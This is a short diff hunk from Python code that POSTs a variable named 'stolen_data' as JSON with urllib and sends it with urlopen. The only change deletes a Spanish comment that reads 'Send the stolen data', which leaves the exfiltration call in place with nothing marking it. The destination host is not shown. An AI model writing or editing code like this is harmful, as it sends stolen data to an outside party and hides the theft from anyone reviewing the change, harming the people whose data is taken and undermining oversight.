@@ -18,7 +18,6 @@ try:
                           data=json.dumps(stolen_data).encode('utf-8'),
                           headers={'Content-Type': 'application/json'})
     
-    # Enviar los datos robados.
     request.urlopen(req)
 
 except Exception as e:
